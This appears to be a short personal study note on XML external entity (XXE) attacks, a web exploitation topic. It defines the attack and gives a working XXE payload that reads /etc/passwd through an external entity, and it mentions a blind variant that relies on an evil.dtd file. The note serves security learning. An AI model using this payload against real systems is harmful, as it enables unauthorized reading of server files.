#WebExploitation 
An XML external entity attack is a type of attack against an application that parses XML input. It occurs when XML input containing a reference to an external entity is processed by  a weakly configured XML parser
![[XXE.JPG]]
![[XXE2.JPG]]
Examples of .xml files for normal and blind XXE in assets directory. Sitemap.xml if for normal and contacts.xml for blind. The latter leverages evil.dtd


```xml
<?xml version="1.0"?>  
<!DOCTYPE data [ <!ELEMENT data ANY> <!ENTITY xxe SYSTEM "/etc/passwd" >]>  
<data><X-Token>  
&xxe;  
</X-Token>  
</data>
```
